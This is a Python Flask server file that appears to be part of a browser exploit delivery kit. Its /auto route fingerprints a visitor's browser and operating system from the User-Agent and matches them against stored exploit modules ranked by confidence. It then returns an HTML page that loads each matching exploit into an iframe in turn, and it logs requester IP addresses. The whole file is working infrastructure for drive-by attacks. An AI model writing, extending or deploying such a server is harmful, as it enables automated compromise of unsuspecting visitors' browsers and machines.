from base.webserver import *
from base.webserver import init as base_init
from lib.config import *
from pathlib import Path
from lib.helper import get_uuid
from jinja2 import Environment, FileSystemLoader
from flask import Response
import json
import os

EXPLOIT_PATHS = Path(os.path.join(CAMPAIGN_PATH, 'memory', 'exploits'))

class Campaign(Base):
  def get_candidates(self):
    results = []
    for item in server.config['tree']:
      root_dir = server.config['tree'][item]['root_dir']
      try:
        with open(os.path.join(root_dir, 'info.json'), 'r', encoding='utf-8') as f:
          info = json.load(f)
          results.append({
            "name": item,
            "confidence": info['confidence'],
            "browsers": info['supported_browsers'],
            "os": info['supported_os']})
      except Exception as e:
        pass
    return results

  def has_browser_match(self, ua, browser_candidates):
    for browser in browser_candidates:
      for name, version in browser.items():
        ver_min = version['min']
        ver_max = version['max']
        print(f'{ua.agent_family} ({ua.agent_version}) vs {name} ({ver_min} - {ver_max})')
        if ua.is_browser(name) and ua.compare_browser_version(ver_min) >= 0 and ua.compare_browser_version(ver_max) <= 0:
          return True
    return False

  def has_os_match(self, ua, os_candidates):
    for os in os_candidates:
      for name, version in os.items():
        ver_min = version['min']
        ver_max = version['max']
        if ua.is_os(name) and ua.compare_os_version(ver_min) >= 0 and ua.compare_os_version(ver_max) <= 0:
          return True
    return False

  def find_exploit_candidates(self, ua):
    candidates = []
    candidat_list = self.get_candidates()
    for candidate in candidat_list:
      name = candidate['name']
      browsers = candidate['browsers']
      os = candidate['os']
      if self.has_os_match(ua, os) and self.has_browser_match(ua, browsers):
        candidates.append(candidate)
    candidates = sorted(candidates, key=lambda data: data['confidence'], reverse=True)
    return candidates

  def make_html_loader(self, candidates):
    # Populate the exploit URLs
    url_list = list(
      urljoin(get_pingback_url(), server.config['tree'][candidate['name']]['uuid'])
      for candidate in candidates)

    html = f"""
    <html>
    <head>
    <!---
    {candidates}
    ---->
    <script>
    const urlList = {url_list};
    let index = 0;
    function start() {{
      const iframe = document.getElementById("loader");
      if (iframe) {{
        const timer = setInterval(() => {{
          iframe.src = urlList[index];
          index++;
          if (index >= urlList.length) {{
            clearInterval(timer);
          }}
       }}, 3000)
      }}
    }}
    </script>
    </head>
    <body onload="start()">
    <iframe id="loader" src="about:blank"></iframe>
    </body>
    </html>
    """
    return html

  @route('/auto')
  def auto(self):
    ua = UserAgent(request.headers.get('User-Agent'))
    candidates = self.find_exploit_candidates(ua)
    if len(candidates) == 0:
      return 'No content to send\n'
    print(f'Found candidates: {candidates}')
    return self.make_html_loader(candidates)

class ExploitRoute(MethodView):
  def __init__(self, modname, root_dir):
    self.modname = modname
    self.env = Environment(loader=FileSystemLoader(root_dir))

  def get_remote_addr(self):
    remote_addr = request.headers.getlist('X-FORWARDED-FOR')[0] if request.headers.getlist('X-FORWARDED-FOR') else request.remote_addr
    return remote_addr

  def get(self):
    print(f'{self.modname}: {self.get_remote_addr()} requested index.html')
    index_page = self.env.get_template('index.html')
    return index_page.render()

def load_tree():
  tree = {}
  for folder in os.listdir(EXPLOIT_PATHS):
    root_dir = os.path.join(EXPLOIT_PATHS, folder)
    if has_mandatory_resources(root_dir):
      tree[folder] = {"root_dir": root_dir, "uuid": get_uuid()}
  return tree

def has_mandatory_resources(root_dir):
  for item in ['index.html', 'info.json']:
    p = os.path.join(root_dir, item)
    if not os.path.exists(p):
      return False
  return True

def register_routes(tree):
  for item in tree:
    unique_id = tree[item]['uuid']
    root_dir = tree[item]['root_dir']
    exploit_view = ExploitRoute.as_view(unique_id, modname=item, root_dir=root_dir)
    server.add_url_rule(f'/{unique_id}', view_func=exploit_view, methods=['GET'])

def list_endpoints(tree):
  print('Available endpoints:')
  print(f'/auto')
  for item in tree:
    print(f'{item}: /{tree[item]["uuid"]}')

def init(args):
  base_init(args)
  tree = load_tree()
  register_routes(tree)
  list_endpoints(tree)
  server.config['tree'] = tree

Campaign.register(server, route_base='/')
